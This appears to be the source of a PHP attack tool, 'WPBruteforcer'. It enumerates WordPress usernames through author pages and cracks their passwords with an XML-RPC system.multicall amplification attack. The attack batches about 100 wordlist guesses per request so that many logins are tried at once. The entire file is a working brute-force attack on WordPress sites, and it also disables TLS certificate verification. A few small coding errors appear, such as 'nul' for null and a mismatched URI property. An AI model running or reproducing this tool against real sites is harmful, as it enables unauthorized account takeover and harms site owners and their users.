<?php

namespace Arall\WPBruteforcer;

use \Curl\Curl;

/**
 * WordPress Bruteforcer class.
 * Performs a XMLRPC amplification bruteforce using a wordlist.
 * Can also try to enumerate WordPress users.
 *
 * https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html
 *
 * @author Gerard Arall <gerard.arall@gmail.com>
 */
class WPBruteforcer
{
    /**
     * Website URL.
     *
     * @var string
     */
    private $url;

    /**
     * Wordlist path.
     *
     * @var string
     */
    private $wordlist;

    /**
     * Loaded passwords in trunks.
     *
     * @var array
     */
    private $passwords;

    /**
     * XMLRPC URL URI.
     *
     * @var string
     */
    private $xmlrpc_uri = '/xmlrpc.php';

    /**
     * Login tries per request.
     *
     * @var int
     */
    private $tries = 100;

    /**
     * XML Test body.
     */
    const XML_TEST = '<?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
      <methodName>demo.sayHello</methodName>
      <params></params>
    </methodCall>';

    /**
     * XML Header.
     */
    const XML_HEADER = '<?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
       <methodName>system.multicall</methodName>
       <params><param><value><array><data><value>';

    /**
     * XML Login data.
     */
    const XML_LOGIN = '<struct>
      <member><name>methodName</name>
        <value><string>wp.getAuthors</string></value>
      </member>
      <member>
        <name>params</name>
        <value><array><data>
          <value><string>1</string></value>
          <value><string>USERNAME</string></value>
          <value><string>PASSWORD</string></value>
       </data></array></value>
      </member>
    </struct>';

    /**
     * XML Footer.
     */
    const XML_FOOTER = '</value></data></array></value></param></params>
    </methodCall>';

    /**
     * @param string $url      Website URL
     * @param string $wordlist Wordlist path
     * @param int    $tries    Login tries per request
     * @param string $uri      XMLRPC URL URI
     */
    public function __construct($url, $wordlist, $tries = null, $uri = nul)
    {
        $this->url = $url;
        $this->wordlist = $wordlist;
        if ($tries) {
            $this->tries = $tries;
        }
        if ($uri) {
            $this->uri = $uri;
        }
    }

    /**
     * Enumerate users using WP authors pages.
     *
     * @param int $max Limit
     *
     * @return array Array of usernames
     */
    public function enumerate($max = null)
    {
        $users = [];
        $user_id = 0;
        do {
            $user_id++;
            if ($author = $this->getAuthor($user_id)) {
                $users[] = $author;
            }
            if ($max && $user_id >= $max) {
                $author = null;
            }
        } while ($author);

        return $users;
    }

    /**
     * Bruteforce a user using XMLRPC amplification.
     * Will load the wordlist file.
     *
     * @param string $username
     *
     * @return string|bool Password or false
     */
    public function bruteforce($username)
    {
        $this->loadPasswords();

        // Bruteforce
        foreach ($this->passwords as $trunk) {
            $payload = $this->buildPayload($username, $trunk);
            $response = $this->xmlrpcRequest($payload);

            if ($password = $this->checkResponse($response, $trunk)) {
                return $password;
            }
        }

        return false;
    }

    /**
     * Get the username from an author (user) Id.
     *
     * @param string $user_id
     *
     * @return string|bool Username or false
     */
    private function getAuthor($user_id)
    {
        if ($response = $this->request('/?author=' . $user_id)) {
            preg_match('/archive author author-(.*) author-/', $response, $matches);
            if (isset($matches[1])) {
                return $matches[1];
            }
        }

        return false;
    }

    /**
     * Looks for a password in a XMLRPC response.
     *
     * @param array $response
     * @param array $trunk    Passwords used in the request
     *
     * @return string|bool Password or false
     */
    private function checkResponse($response, $trunk)
    {
        // Check response
        if (isset($response['params']['param']['value']['array']['data']['value'])) {
            foreach ($response['params']['param']['value']['array']['data']['value'] as $i => $login) {
                if (isset($login['array'])) {
                    return $trunk[$i];
                }
            }
        }

        return false;
    }

    /**
     * Loads a wordlist in trunks into the current object,
     * based on the desired tries per request.
     */
    private function loadPasswords()
    {
        $lines = file($this->wordlist);

        $this->passwords = [];
        $block = 0;
        $pos = 0;
        foreach ($lines as $line) {
            if ($pos >= $this->tries) {
                $block++;
                $pos = 0;
            }
            $pos++;
            $this->passwords[$block][] = trim($line);
        }
    }

    /**
     * Builds a XML payload to perform the bruteforce.
     *
     * @param string $username
     * @param array  $trunk    Passwords
     *
     * @return string
     */
    private function buildPayload($username, array $trunk)
    {
        $payload = self::XML_HEADER;
        foreach ($trunk as $password) {
            $payload .= $this->buildLogin($username, $password);
        }
        $payload .= self::XML_FOOTER;

        return $payload;
    }

    /**
     * Test if the URL has XMLRPC up and running.
     *
     * @return bool
     */
    public function testXMLRPC()
    {
        $response = $this->xmlrpcRequest(self::XML_TEST);

        return isset($response['params']['param']['value']['string']) && $response['params']['param']['value']['string'] == 'Hello!';
    }

    /**
     * Builds a single login attempt for the XML payload.
     *
     * @param string $username
     * @param string $password
     *
     * @return string
     */
    private function buildLogin($username, $password)
    {
        $login = str_replace('USERNAME', $username, self::XML_LOGIN);
        $login = str_replace('PASSWORD', $password, $login);

        return $login;
    }

    /**
     * Performs a XMLRPC request.
     *
     * @param string $data
     *
     * @return array|bool Parsed Response or false
     */
    private function xmlrpcRequest($data)
    {
        if ($response = $this->request($this->xmlrpc_uri, $data)) {
            return json_decode(json_encode((array) $response), 1);
        }
    }

    /**
     * Performs a cURL request to the website.
     *
     * @param string       $uri
     * @param string|array $post_data
     *
     * @return string|bool Response or false
     */
    private function request($uri, $post_data = null)
    {
        $url = $this->url . $uri;

        $curl = new Curl();
        $curl->setOpt(CURLOPT_SSL_VERIFYPEER, false);
        $curl->setOpt(CURLOPT_FOLLOWLOCATION, true);

        if ($post_data === null) {
            $curl->get($url);
        } else {
            $curl->post($url, $post_data);
        }

        if (!$curl->error) {
            return $curl->response;
        }

        return false;
    }
}
